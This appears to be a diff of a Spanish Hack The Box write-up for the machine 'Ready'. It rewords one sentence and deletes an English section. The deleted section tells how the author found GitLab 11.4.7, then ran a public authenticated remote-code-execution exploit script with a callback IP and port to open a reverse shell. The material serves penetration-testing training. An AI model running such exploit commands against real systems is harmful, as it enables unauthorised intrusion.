@@ -44,33 +44,9 @@ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Sitio web
 
-Ahora que ya sabemos los puertos abiertos que se ejecutan pasaremos a inspeccionar el sitio web, apartados, subapartados, etc.
+Ahora que ya conocemos los puertos abiertos que se ejecutan pasaremos a inspeccionar el sitio web, apartados, subapartados, etc.
 
 ![](/assets/images/htb-writeup-ready/index.png)
-
-We have access to create a new account.
-
-![](/assets/images/htb-writeup-ready/gitlab2.png)
-
-Once logged in, we see in the projects list there's a single projet called *ready-channel*.
-
-![](/assets/images/htb-writeup-ready/gitlab3.png)
-
-To check the Gitlab version we go to the Help section and we can see it's running 11.4.7.
-
-![](/assets/images/htb-writeup-ready/gitlab5.png)
-
-A quick search on Exploit-DB shows there's an authenticated remote code execution vulnerability for this exact version.
-
-![](/assets/images/htb-writeup-ready/gitlab6.png)
-
-`python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444`
-
-Reverse shell connection:
-
-![](/assets/images/htb-writeup-ready/shell.png)
-
-![](/assets/images/htb-writeup-ready/user.png)
 
 ## Privesc
 
